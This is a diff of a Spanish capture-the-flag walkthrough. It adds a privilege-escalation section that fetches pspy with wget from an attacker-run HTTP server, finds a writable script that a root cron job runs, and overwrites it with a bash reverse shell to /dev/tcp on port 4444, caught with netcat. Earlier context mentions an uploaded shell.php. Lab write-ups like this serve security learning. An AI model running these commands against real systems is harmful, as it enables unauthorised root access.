@@ -61,7 +61,7 @@ Ahora subimos el archivo usando el servicio ftp en la carpeta ftp.
 Esto debería reflejarse en la carpeta del sitio web en la ruta `/files/ftp`
 ![0718231121.png](0718231121.png)
 
-# Reverse shell
+## Reverse shell
 
 Ahora para conectarnos deberemos estar a la escucha con netcat 
 
@@ -72,7 +72,7 @@ Y entramos al enlace de **shell.php**
 
 ![0718231120.png](0718231120.png)
 
-# User flag
+## User flag
 
 Aquí encontramos la receta secreta y un archivo sospechozo llamado `suspicious.pcapng`, esto podemos descargarlo copiandolo en la carpeta files.
 
@@ -90,4 +90,43 @@ Podemos conectarnos por ssh.
 ssh lennie@10.10.129.101
 ```
 
-continue...
+## Privilege Scalation
+
+Dentro de la carpeta home de lennie encontramos una carpeta scripts con unos cuantos códigos en bash que llaman a el archivo de ruta `/etc/print.sh`, el cual tenemos permisos de escritura
+![0817231139](0817231139.png)
+
+Usaremos pspy para monitorear lo que hace el sistema. Podemos subir este archivo montando un servidor http en nuestro equipo y descargar el archivo pspy con wget desde la maquina victima.
+
+```shell
+# Iniciar el servidor http en tu equipo
+sudo python3 -m http.server 80
+
+# Descargar el archivo pspy desde la maquina victima
+wget http://tuip/pspy32s
+
+# Ejecutar pspy
+chmod +x pspy32s
+./pspy32s
+```
+
+Vemos que se esta ejecutando el archivo **planner.sh** repetidamente.
+
+![0818010100](0818010100.png)
+
+Ya que tenemos permisos de escritura sobre un archivo que ejecuta planer.sh y segun pspy es ejecutado con un UID=0 por lo que quien lo ejecuta será el mismo root.
+
+Ahora para lograr escalar privilegios necesitamos modificar el archivo **print.sh** que vimos antes para que ejecute una shell reversa.
+
+**print.sh**
+```shell
+#!/bin/bash
+bash -i >& /dev/tcp/10.13.13.243/4444 0>&1
+```
+
+Esperamos con netcat en el puerto 4444
+
+```shell
+nc -lvp 4444
+```
+
+![0818010122](0818010122.png)
